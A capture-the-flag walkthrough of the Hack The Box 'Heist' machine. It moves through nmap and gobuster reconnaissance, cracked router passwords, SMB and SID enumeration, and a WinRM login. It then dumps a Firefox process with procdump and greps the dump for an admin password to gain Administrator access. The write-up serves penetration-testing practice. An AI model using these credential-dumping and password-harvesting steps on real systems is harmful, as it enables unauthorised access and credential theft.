---
title: "Hackthebox Heist Walkthrough"
date: 2021-07.03 15.00 
categories: [Hackthebox, Linux]
tags: [procdump]
author: CEngover
image: /assets/img/posts/heist/heist.png
---
## Reconnaissance

As always we do, let's start with nmap scanning.

```bash
cengover@kali:~/htb/heist$ sudo nmap -sC -sV -oN nmap/hesit-top-ports 10.10.10.149
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 06:18 EDT
Nmap scan report for 10.10.10.149
Host is up (0.076s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 12m28s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-03T10:31:08
|_  start_date: N/A


```

We have 3 ports open which are default http and smb service ports. On smb we cannot do anything for now. It's required authentication. 

There is a login page which is written in PHP on HTTP service. We can visit there by following 80 port. Doing fuzzing process we can see what kind of files we reach on web server.

```bash
cengover@kali:~/htb/heist$ gobuster dir -u http://heist.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt,html,sql
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://heist.htb
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html,sql
[+] Timeout:        10s
===============================================================
2021/07/03 06:33:13 Starting gobuster
===============================================================
/login.php (Status: 200)
/images (Status: 301)
/js (Status: 301)
/index.php (Status: 302)
/css (Status: 301)
/attachments (Status: 301)
/. (Status: 302)
/errorpage.php (Status: 200)
/issues.php (Status: 302)

```

There are a lot file that we can check but once we login as guest user, we'll see a conversation between Hazard and Support Admin. Once we click attachment link we can see there are usernames and encoded passwords which are seem like belonging to Cisco Router config file. After cracking the passwords we'll get following decoded passwords.

```
$1$pdQG$o8nrSzsGXeaduXrjlvKc91 -> stealth1agent
0242114B0E143F015F5D1E161713 -> $uperP@ssword
02375012182C1A1D751618034F36415408 -> Q4)sJu\Y8qz*A3?d
```

We can list shared folders with `Hazard` and `stealth1agent` credentials but we have no access on these folders.

```bash
cengover@kali:~/htb/heist$ smbmap -H 10.10.10.149 -u 'Hazard' -p 'stealth1agent'
[+] IP: 10.10.10.149:445        Name: heist.htb                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC


```


For more enumeration I tried enum4linux tool but `SID` is required for these creds. After that I used one of the impacket tools called `lookupsid.py` for user enumeration and found there are many user such as Chase, Jason etc.

```bash
cengover@kali:~/htb/heist$ python3 lookupsid.py Hazard:stealth1agent@heist.htb
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Brute forcing SIDs at heist.htb
[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)

```

Now we can try passwords that we found before on these users. On smb I could not get access again. After a full port scanning we can see there is another port wh,ch is 5985.

```bash
cengover@kali:~/htb/heist$ nmap -sV -p- heist.htb -oN nmap/heist-all-ports -v
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 07:18 EDT
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 07:18
Nmap scan report for heist.htb (10.10.10.149)
Host is up (0.074s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```


## Getting Initial Access

We can try to get initial access with the usernames and passwords on this port via evil-winrm. 

![Getting Access](/assets/img/posts/heist/access.png)

After some searching on the box I saw there is firefox.exe and there are running process that blong to firefox.

```bash
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Chase\Desktop> ps                                                                                                       
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                      
-------  ------    -----      -----     ------     --  -- -----------                                                                                               
    355      25    16352     297340       0.09   6100   1 firefox          
   1049      77   206088     559208       7.91   6644   1 firefox          
    347      19     9968      34768       0.08   6752   1 firefox
    401      36    51716     111188       1.14   6880   1 firefox
    378      30    35104      71328       0.88   7152   1 firefox  
```

Let's upload `procdump` and dump one of these process.

```bash
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Chase\Desktop> upload procdump64.exe                                                                                                                                                          
Info: Uploading procdump64.exe to C:\Users\Chase\Desktop\procdump64.exe                    
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Chase\Desktop> dir                           
Mode                LastWriteTime         Length Name             
----                -------------         ------ ----
-a----         7/3/2021   5:24 PM         384888 procdump64.exe             
-a----        4/22/2019   9:08 AM            121 todo.txt   
-a----        4/22/2019   9:07 AM             32 user.txt


[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Chase\Desktop>./procdump64.exe -accepteula -ma 6100

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[17:40:02] Dump 1 initiated: C:\Users\Chase\Desktop\firefox.exe_210703_174002.dmp
[17:40:02] Dump 1 writing: Estimated dump file size is 298 MB.
[17:40:03] Dump 1 complete: 298 MB written in 0.4 seconds
[17:40:03] Dump count reached.


[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Chase\Desktop> download firefox.exe_210703_174002.dmp
Info: Downloading C:\Users\Chase\Desktop\firefox.exe_210703_174002.dmp to firefox.exe_210703_174002.dmp

```

## Privilege Escalation

After got this dump, we can see human readable text with string command and we can search whatever we want.

```bash
cengover@kali:~/htb/heist$ strings firefox.exe_210703_174002.dmp | grep -n "login_password"
844:MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
2304:RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
2356:MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

As final step, once we use this password with Administrator account we can get full privilige on the system.

![Getting Admin Privileges](/assets/img/posts/heist/getting_admin.png)


